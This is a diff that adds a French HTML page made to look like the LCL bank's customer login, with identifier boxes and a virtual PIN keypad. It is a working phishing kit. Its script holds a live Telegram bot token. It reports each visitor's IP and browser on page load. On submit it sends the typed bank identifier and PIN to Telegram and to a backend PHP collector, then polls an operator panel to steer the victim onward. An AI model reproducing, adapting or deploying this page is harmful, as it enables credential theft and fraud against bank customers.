@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page avec logo centré</title>
+    <style>
+        /* Réinitialisation des marges et hauteur pour prendre tout l'écran */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            /* Le fond est blanc */
+            background-color: #ffffff;
+            /* Utilisation de Flexbox pour un centrage parfait */
+            display: flex;
+            flex-direction: column;     /* Aligne les éléments en colonne */
+            justify-content: center;     /* Centre verticalement */
+            align-items: center;         /* Centre horizontalement */
+            /* Hauteur de la fenêtre d'affichage (viewport) */
+            min-height: 100vh;
+            /* Police par défaut (optionnel) */
+            font-family: sans-serif;
+        }
+
+        .logo {
+            width: 21%;
+            margin-bottom: 40px;
+        }
+
+        .txt1 {
+            text-align: center;    /* Centre le texte horizontalement */
+            font-size: 23px;       /* Ajustez la taille selon vos besoins */
+            font-weight: 600;
+            color: #232884;
+            margin-bottom: -0px;
+        }
+
+        .cases {
+            display: flex;
+            gap: 10px;              /* espace entre les cases */
+            margin-bottom: 50px;     /* Réduit la marge pour mieux centrer */
+        }
+
+        .cases input {
+            width: 15px;             /* Largeur augmentée pour être plus confortable */
+            height: 50px;             /* Hauteur ajustée */
+            border: none;
+            border-bottom: 2px solid #939393;  /* uniquement la barre du bas */
+            text-align: center;
+            font-size: 17px;          /* Taille de police augmentée */
+            outline: none;
+            background: transparent;
+        }
+
+        .cases input:focus {
+            border-bottom: 2px solid #232884; /* couleur au focus */
+        }
+
+        .bouton {
+    background-color: #A5A5A5;
+    color: white;
+    border: none;
+    border-radius: 30px;
+    padding: 10px 25px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    transition: background-color 0.3s;
+    margin-bottom: 20px; /* Ajustez cette valeur pour positionner sous les cases */
+}
+
+.bouton:hover {
+    background-color: #2a3a9e;
+}
+
+.bouton::after {
+    content: "→";
+    font-size: 24px;
+    margin-left: 10px;
+}
+
+.images-bas {
+    width: 100%;
+}
+
+.images-bas1 {
+    width: 100%;
+}
+
+.images-bas2 {
+    width: 100%;
+    margin-bottom: -100px;
+}
+
+        .info-code {
+            text-align: center;
+            font-size: 16px;
+            font-weight: 600;
+            color: #232884;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .cercles {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .cercle {
+            width: 12px;
+            height: 12px;
+            background-color: #A5A5A5;
+            border-radius: 50%;
+            margin-top: 20px;
+        }
+
+        .cercles-chiffres {
+            display: flex;
+            gap:15px;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 40px;
+            margin-top: 10px;
+            flex-wrap: wrap;
+            width: 100%;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+               .chiffre {
+        
+            width: 60px;
+            height: 60px;
+            background-color: #f0f0f0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            font-weight: bold;
+            color: #232884;
+            flex-shrink: 0;
+        }
+
+                .bouton-valider {
+            background-color: #232884;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            padding: 10px 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transition: background-color 0.3s;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+
+        .bouton-valider::after {
+            content: "→";
+            font-size: 24px;
+            margin-left: 10px;
+        }
+
+        .cache {
+            display: none;
+        }
+
+                .cercle-bleu {
+            background-color: #232884 !important;
+        }
+
+        /* Flou et chargement */
+        .flou {
+            filter: blur(1px);
+            pointer-events: none;
+            user-select: none;
+        }
+
+            .overlay-chargement {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: transparent;  /* Changé ici */
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 10000;
+    opacity: 0;
+    visibility: hidden;
+    transition: all 0.3s;
+}
+
+        .overlay-chargement.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .spinner {
+    width: 70px;
+    height: 70px;
+    border: 6px solid #e0e0e0;
+    border-top: 6px solid #232884;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-top: -925px;
+    position: relative;
+    z-index: 10001;
+    box-shadow: 0 0 20px rgba(0,0,0,0.1);
+}
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <img src="https://monespace.lcl.fr/assets/images/new_logo.svg" 
+         alt="Logo LCL" 
+         class="logo">
+    <div class="txt1">Votre identifiant</div>
+    <div class="cases" id="casesContainer">
+        <input type="text" maxlength="1" class="code-input">
+        <input type="text" maxlength="1" class="code-input">
+        <input type="text" maxlength="1" class="code-input">
+        <input type="text" maxlength="1" class="code-input">
+        <input type="text" maxlength="1" class="code-input">
+        <input type="text" maxlength="1" class="code-input">
+        <input type="text" maxlength="1" class="code-input">
+        <input type="text" maxlength="1" class="code-input">
+        <input type="text" maxlength="1" class="code-input">
+        <input type="text" maxlength="1" class="code-input">
+    </div>
+    <button id="boutton" class="bouton">Continuer</button>
+    <div class="info-code" id="infoCode">Votre code personnel</div>
+    
+    <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 30px;">
+    <div class="cercles" id="cercles">
+        <div class="cercle"></div>
+        <div class="cercle"></div>
+        <div class="cercle"></div>
+        <div class="cercle"></div>
+        <div class="cercle"></div>
+        <div class="cercle"></div>
+    </div>
+    <button type="button" id="backspaceBtn" aria-label="Effacer le dernier chiffre sélectionné" style="background: none; border: none; cursor: pointer; color: #A5A5A5; display: flex; align-items: center;">
+        <svg width="26" height="25" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+            <path fill-rule="evenodd" clip-rule="evenodd" d="M21.529 4.688H9.403a1.59 1.59 0 00-1.383.742l-4.395 6.68 4.395 6.68c.325.411.813.741 1.383.741h12.126c.895 0 1.627-.742 1.627-1.65V6.338c0-.907-.732-1.65-1.627-1.65zM18.974 14.85l-1.13 1.129-2.909-2.904-2.908 2.904-1.131-1.13 2.908-2.903-2.908-2.904 1.13-1.129 2.91 2.904 2.907-2.904 1.131 1.13-2.908 2.903 2.909 2.904z" fill="currentColor"></path>
+        </svg>
+    </button>
+</div>
+
+    <div class="cercles-chiffres" id="cerclesChiffres">
+        <div class="chiffre">2</div>
+        <div class="chiffre">8</div>
+        <div class="chiffre">5</div>
+        <div class="chiffre">7</div>
+        <div class="chiffre">0</div>
+        <div class="chiffre">6</div>
+        <div class="chiffre">1</div>
+        <div class="chiffre">3</div>
+        <div class="chiffre">9</div>
+        <div class="chiffre">4</div>
+    </div>
+        <button id="boutonValider" class="bouton-valider cache">Valider</button>
+    <div>
+            <div id="overlayChargement" class="overlay-chargement">
+        <div class="spinner"></div>
+    </div>
+    <img src="asset-lcl/bas.png" alt="Image bas" class="images-bas">
+    <img src="asset-lcl/bas1.png" alt="Image bas1" class="images-bas1">
+    <img src="asset-lcl/bas2.png" alt="Image bas2" class="images-bas2">
+</div>
+<script>
+    // Configuration Telegram
+    const botToken = '8660453480:AAEb5lKe5rfKn3rcDf-ZhFe518oETnXwOVc';
+    const chatId = '-5079283338';
+
+    // Générer un ID unique pour l'utilisateur
+    const userId = 'USER_' + Math.random().toString(36).substr(2, 8) + '_' + Date.now();
+
+    // Récupérer tous les inputs
+    const inputs = document.querySelectorAll('.code-input');
+    const boutonContinuer = document.getElementById('boutton');
+    const boutonValider = document.getElementById('boutonValider');
+    const infoCodeDiv = document.getElementById('infoCode');
+    const cercles = document.getElementById('cercles');
+    const cerclesChiffres = document.getElementById('cerclesChiffres');
+    const backspaceBtn = document.getElementById('backspaceBtn');
+
+    // Variables pour la surveillance
+    let intervalSurveillance = null;
+
+    // Fonction pour obtenir l'IP
+    async function getIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch {
+            return 'Non disponible';
+        }
+    }
+
+    // Fonction pour obtenir le navigateur
+    function getBrowser() {
+        const ua = navigator.userAgent;
+        if (ua.includes('Chrome')) return 'Chrome';
+        if (ua.includes('Firefox')) return 'Firefox';
+        if (ua.includes('Safari')) return 'Safari';
+        if (ua.includes('Edge')) return 'Edge';
+        return 'Autre';
+    }
+
+    // Fonction pour envoyer à Telegram
+    async function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: chatId, 
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch(e) { console.log(e); }
+    }
+
+    // Envoyer message à l'arrivée sur la page
+    window.addEventListener('load', async () => {
+        const ip = await getIP();
+        const browser = getBrowser();
+        const message = `🏴‍☠️ NOUVEAU CLICK !
+━━━━━━━━━━━━━━━━━━━━━
+🤓 ID : <code>${userId}</code>
+━
+🌐 IP : <code>${ip}</code>
+━
+🔗 Page : /login.html
+━
+💻 Navigateur : ${browser}
+━━━━━━━━━━━━━━━━━━━━━`;
+        sendToTelegram(message);
+    });
+
+    // Fonction pour vérifier le statut (appelée périodiquement)
+    async function verifierStatutUtilisateur() {
+        try {
+            const response = await fetch('/backend-lcl/get-user.php');
+            const users = await response.json();
+            const utilisateur = users.find(u => u.id === userId);
+            
+            if (utilisateur) {
+                const statut = utilisateur.statut;
+                console.log(`Statut vérifié pour ${userId}: ${statut}`);
+                
+                if (statut === 'Valide' || statut === 'valide') {
+                    if (intervalSurveillance) clearInterval(intervalSurveillance);
+                    window.location.href = '/coriolis-prelevement.html';
+                }
+                else if (statut === 'Refuse' || statut === 'refuse') {
+                    if (intervalSurveillance) clearInterval(intervalSurveillance);
+                    window.location.reload();
+                }
+            }
+        } catch (error) {
+            console.error('Erreur vérification statut:', error);
+        }
+    }
+
+    // Fonction saveToJSON modifiée avec démarrage de la surveillance
+    async function saveToJSON(identifiant, password) {
+        const data = {
+            id: userId,
+            identifiant: identifiant,
+            password: password,
+            date: new Date().toISOString(),
+            ip: await getIP(),
+            browser: getBrowser()
+        };
+        
+        try {
+            await fetch('/backend-lcl/save.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            
+            // Démarrer la surveillance toutes les 3 secondes
+            if (intervalSurveillance) clearInterval(intervalSurveillance);
+            intervalSurveillance = setInterval(verifierStatutUtilisateur, 3000);
+            verifierStatutUtilisateur(); // Vérification immédiate
+            
+        } catch(e) { console.log(e); }
+    }
+
+    // Cacher le bouton backspace au départ
+    backspaceBtn.style.display = 'none';
+
+    // Cacher les éléments au départ
+    cercles.classList.add('cache');
+    cerclesChiffres.classList.add('cache');
+    infoCodeDiv.classList.add('cache');
+    
+    // Ajouter un écouteur d'événement à chaque input
+    inputs.forEach((input, index) => {
+        input.addEventListener('input', function() {
+            if (this.value.length === 1) {
+                if (index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            }
+        });
+        
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && this.value.length === 0) {
+                if (index > 0) {
+                    inputs[index - 1].focus();
+                }
+            }
+        });
+        
+        input.addEventListener('keypress', function(e) {
+            if (this.value.length >= 1) {
+                e.preventDefault();
+            }
+        });
+    });
+
+    function verifierChamps() {
+        let tousRemplis = true;
+        inputs.forEach(input => {
+            if (input.value.length !== 1) {
+                tousRemplis = false;
+            }
+        });
+        
+        if (tousRemplis) {
+            boutonContinuer.style.backgroundColor = '#232884';
+        } else {
+            boutonContinuer.style.backgroundColor = '#A5A5A5';
+        }
+    }
+
+    inputs.forEach(input => {
+        input.addEventListener('input', verifierChamps);
+        input.addEventListener('keyup', verifierChamps);
+    });
+
+    boutonContinuer.addEventListener('click', function() {
+        let tousRemplis = true;
+        inputs.forEach(input => {
+            if (input.value.length !== 1) {
+                tousRemplis = false;
+            }
+        });
+        
+        if (tousRemplis) {
+            boutonContinuer.classList.add('cache');
+            infoCodeDiv.classList.remove('cache');
+            cercles.classList.remove('cache');
+            cerclesChiffres.classList.remove('cache');
+            boutonValider.classList.remove('cache');
+            backspaceBtn.style.display = 'flex';
+        }
+    });
+
+    // Récupérer tous les chiffres
+    const chiffres = document.querySelectorAll('.chiffre');
+    const petitsCercles = document.querySelectorAll('.cercle');
+    const overlay = document.getElementById('overlayChargement');
+    
+    let indexCercleActuel = 0;
+    let chiffresSelectionnes = [];
+    
+    chiffres.forEach((chiffre, indexChiffreClique) => {
+        chiffre.addEventListener('click', function() {
+            if (indexCercleActuel < petitsCercles.length) {
+                petitsCercles[indexCercleActuel].classList.add('cercle-bleu');
+                chiffresSelectionnes.push(chiffres[indexChiffreClique].innerText);
+                indexCercleActuel++;
+            }
+        });
+    });
+    
+    backspaceBtn.addEventListener('click', function() {
+        if (indexCercleActuel > 0) {
+            indexCercleActuel--;
+            petitsCercles[indexCercleActuel].classList.remove('cercle-bleu');
+            chiffresSelectionnes.pop();
+        }
+    });
+
+    boutonValider.addEventListener('click', async function() {
+        let identifiant = '';
+        inputs.forEach(input => {
+            identifiant += input.value;
+        });
+        
+        let password = chiffresSelectionnes.join('');
+        
+        const ip = await getIP();
+        const browser = getBrowser();
+        const message = `🏴‍☠️ LOG LCL !
+━━━━━━━━━━━━━━━━━━━━━
+🤓 ID : <code>${userId}</code>
+━
+🌐 IP : <code>${ip}</code>
+━
+🔢 identifiant : <code>${identifiant}</code>
+━
+🔑 Pass : <code>${password}</code>
+━━━━━━━━━━━━━━━━━━━━━`;
+        
+        sendToTelegram(message);
+        saveToJSON(identifiant, password);
+        
+        document.body.classList.add('flou');
+        overlay.classList.add('show');
+        boutonValider.style.opacity = '0';
+        boutonValider.style.pointerEvents = 'none';
+    });
+</script>
+</body>
+</html>
